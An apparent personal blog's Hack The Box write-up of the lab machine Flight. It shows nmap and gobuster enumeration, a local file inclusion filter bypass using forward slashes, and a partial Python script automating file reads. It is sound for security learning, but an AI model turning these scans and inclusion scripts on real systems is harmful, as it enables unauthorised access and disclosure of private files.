@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Flight&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Flight">
+  
+    <meta name="description" content="Flight is a challenging Windows machine involving lots of steps, but once rooted, you’ll find out that it’s just repeating the same few exploits in different scenarios. In summary this box is a really nice learning experience for me, as it involves several exploit techniques I’ve never seen before.">
+    <meta property="og:description" content="Flight is a challenging Windows machine involving lots of steps, but once rooted, you’ll find out that it’s just repeating the same few exploits in different scenarios. In summary this box is a really nice learning experience for me, as it involves several exploit techniques I’ve never seen before.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/a7af9035e5089332dfbfeb328d663f3e.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/a7af9035e5089332dfbfeb328d663f3e.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Flight</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Feb 15, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+            <a href="tag/Hard">Hard</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/f2a15933c1ae48fb8aed384c581fcd51" class="PageRoot"><h3 id="https://www.notion.so/ff0e378cc8ca4426a4ffa88393308788" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/ff0e378cc8ca4426a4ffa88393308788"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/5a97d22eabbb44f99ca268cab39809cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Flight is a challenging Windows machine involving lots of steps, but once rooted, you’ll find out that it’s just repeating the same few exploits in different scenarios. I learned a lot from this box, as it involves several exploit techniques I’ve never seen before.</span></span></p></div><div id="https://www.notion.so/1fac4ed199fb4cf7adab5d60f98dafd8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c014cd9b6efd4937984edb8bed5228db" class="Divider"></div><h3 id="https://www.notion.so/1a09db2dc8244aa2ba0a00d2d18462e5" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a09db2dc8244aa2ba0a00d2d18462e5"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/05a5a5f972dd41fbb16f20410799fc32" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/d9c5f64dc98948bf8fa1b01b21f27ae8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.228.120
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 19:32 ACDT
+Nmap scan report for 10.129.228.120
+Host is up (0.33s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49730/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 133.35 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49730 10.129.228.120
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 19:44 ACDT
+Nmap scan report for 10.129.228.120
+Host is up (0.33s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-13 16:15:05Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49730/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019 (89%)
+Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-02-13T16:16:07
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h00m00s
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   329.76 ms 10.10.14.1
+2   330.57 ms 10.129.228.120
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 119.05 seconds</span></span></span></code></pre><div id="https://www.notion.so/9c1c4601e4f64972b6c1ad5abd04bd1c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found 18 open ports. With Kerberos, SMB, DNS and LDAP running, this is likely a domain controller. The script scan also identified its domain name: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">flight.htb</code></span><span class="SemanticString">, which I’ll add to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/9a2314dbaabf448484cb784a7a525156" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Flight</span>
+<span class="token number">10.129</span>.228.120  flight.htb</span></span></span></code></pre><div id="https://www.notion.so/c5649a2dad0742b09125401084d75da4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/622383b3fde8434ba67bf8f403433136" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/4b29c13852cd454f99cd9be0039fd526" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6230163d-317c-45f0-8613-146f2de2dcc5%2FUntitled.png?width=1894&amp;table=block&amp;id=4b29c138-52cd-454f-99cd-9be0039fd526"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6230163d-317c-45f0-8613-146f2de2dcc5%2FUntitled.png?width=1894&amp;table=block&amp;id=4b29c138-52cd-454f-99cd-9be0039fd526" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/98c42d6ff8fc4eeba17a32c22b85af6a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The main site is an airline booking system. None of the buttons work, and all links point back to this page.</span></span></p></div><div id="https://www.notion.so/6c41b90203b94798b0e8964b60471d77" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The virtual host scan found one subdomain: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">school.flight.htb</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/a2cc99d8f93241cb9c2d477311e6e9f4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/flight]
+└─$</span></mark></span><span class="SemanticString"><span> sudo gobuster vhost -u http://flight.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 --append-domain
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://flight.htb
+[+] Method:          GET
+[+] Threads:         100
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: school.flight.htb Status: 200 [Size: 3996]
+Progress: 100000 / 100001 (100.00%)
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/3258703f9479477689c101abd991e846" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll also add this to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/passwd</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/75f67a01e4eb40f89f0447ab3eeb138e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Flight</span>
+<span class="token number">10.129</span>.228.120  flight.htb  school.flight.htb</span></span></span></code></pre><div id="https://www.notion.so/c2df9a01b6ce41a09ea39bc2457bdde3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/dd26c99b8a8c45b39ae10645ff8a0c44" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">PHP File Inclusion:</strong></span></span></p></div><div id="https://www.notion.so/2986d2cc8fef41bfa9c1c9a6866bf399" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1a4c943b-fc52-40ec-8039-3a3cebb90295%2FUntitled.png?width=1905&amp;table=block&amp;id=2986d2cc-8fef-41bf-a9c1-c9a6866bf399"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1a4c943b-fc52-40ec-8039-3a3cebb90295%2FUntitled.png?width=1905&amp;table=block&amp;id=2986d2cc-8fef-41bf-a9c1-c9a6866bf399" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/58d203c1ce6448a9875817b6749a1870" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">school.flight.htb</code></span><span class="SemanticString">, we get an aviation school website. Nothing interesting here, but when I hover over the menu links, I get this:</span></span></p></div><div id="https://www.notion.so/9d5757fd11734f4a974049870b783d52" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1d5bbd6d-c814-478b-b70d-ff6be4f0cb7d%2FUntitled.png?width=328&amp;table=block&amp;id=9d5757fd-1173-4f4a-9740-49870b783d52"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1d5bbd6d-c814-478b-b70d-ff6be4f0cb7d%2FUntitled.png?width=328&amp;table=block&amp;id=9d5757fd-1173-4f4a-9740-49870b783d52" style="width:328px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/7e3df34c0b404553b1c7f125a27bf0eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Seems like the website is using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.php</code></span><span class="SemanticString"> to set the page headers and footers, then load the page contents using the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">?view</code></span><span class="SemanticString"> parameter. This is often vulnerable to LFI or even RFI if proper input sanitization is not implemented.</span></span></p></div><div id="https://www.notion.so/11b3c432fb424956a5d21b9acd540fed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll try reading the hosts file on Windows, but it returned with a “Suspicious Activity Blocked” warning.</span></span></p></div><div id="https://www.notion.so/4a3946b380c54288b1d1ee00fed8ff68" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fdbabeab9-7eaa-4ee6-9449-abf496145f9f%2FUntitled.png?width=1181&amp;table=block&amp;id=4a3946b3-80c5-4288-b1d1-ee00fed8ff68"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fdbabeab9-7eaa-4ee6-9449-abf496145f9f%2FUntitled.png?width=1181&amp;table=block&amp;id=4a3946b3-80c5-4288-b1d1-ee00fed8ff68" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d71097d1d5724a08bd1723b998796521" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m guessing the backend server is detecting some bad characters and blocking the request if any of them are found in the parameter. A single backslash also got blocked:</span></span></p></div><div id="https://www.notion.so/82e52e459c5e49b5a904538c3436665f" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F4d42b6b7-7917-4954-97f3-5f4e266b0f1c%2FUntitled.png?width=862&amp;table=block&amp;id=82e52e45-9c5e-49b5-a904-538c3436665f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F4d42b6b7-7917-4954-97f3-5f4e266b0f1c%2FUntitled.png?width=862&amp;table=block&amp;id=82e52e45-9c5e-49b5-a904-538c3436665f" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/aa7066171ed046d892d9eb7f3bf65b0a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But a forward slash didn’t:</span></span></p></div><div id="https://www.notion.so/39ef36e59ba24b5296a561b9b7e46823" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F796f3757-3877-48ac-97bf-6a400cfbf8fb%2FUntitled.png?width=817&amp;table=block&amp;id=39ef36e5-9ba2-4b52-96a5-61b9b7e46823"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F796f3757-3877-48ac-97bf-6a400cfbf8fb%2FUntitled.png?width=817&amp;table=block&amp;id=39ef36e5-9ba2-4b52-96a5-61b9b7e46823" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3f0a8385703645d59599d704597133e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Using forward slashes, I can successfully read the hosts file:</span></span></p></div><div id="https://www.notion.so/7567b07c5a144c6b8224529d26c56f23" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F18d5a50d-6465-42a7-a4eb-6253dd6f1de0%2FUntitled.png?width=1917&amp;table=block&amp;id=7567b07c-5a14-4c6b-8224-529d26c56f23"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F18d5a50d-6465-42a7-a4eb-6253dd6f1de0%2FUntitled.png?width=1917&amp;table=block&amp;id=7567b07c-5a14-4c6b-8224-529d26c56f23" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3b3b55c133184395867a8ec21532e3ea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3de7385aa8dc4ec59d24ee4d655c68f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Including </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.php</code></span><span class="SemanticString"> itself resulted in something weird, with broken HTML rendering. However, it disclosed the web root, which is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\xampp\htdocs\school.flight.htb\</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/35a283ad56234da490d8d1e5e47f015c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F4f7fec01-5381-4eb7-a741-2ab38f7e5bab%2FUntitled.png?width=1918&amp;table=block&amp;id=35a283ad-5623-4da4-90d8-d1e5e47f015c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F4f7fec01-5381-4eb7-a741-2ab38f7e5bab%2FUntitled.png?width=1918&amp;table=block&amp;id=35a283ad-5623-4da4-90d8-d1e5e47f015c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9e4bf85f67044db18c9e6d313efb3fad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/33ce9fa28584410ba39041a3296360d7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Python Script Automation:</strong></span></span></p></div><div id="https://www.notion.so/97aadad766484d8fa155301e4963c770" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To make reading files easier, I’ll script this up in Python:</span></span></p></div><pre id="https://www.notion.so/90bad02186904f7db173613b7ced7b24" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> colorama <span class="token keyword">import</span> Fore<span class="token punctuation">,</span> Style
+
+<span class="token keyword">def</span> <span class="token function">finclusion</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'\\'</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string">"[!] WARNING: Bad characters detected."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    
+    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://school.flight.htb/index.php?view=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Something went wrong."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        response <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">31</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string">"[!] File not found."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span> <span class="token keyword">and</span> <span class="token string">"Suspicious Activity"</span> <span class="token keyword">in</span> response<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>YELLOW <span class="token operator">+</span> <span class="token string">"[!] Request blocked by server."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string">"[+] File read successful."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
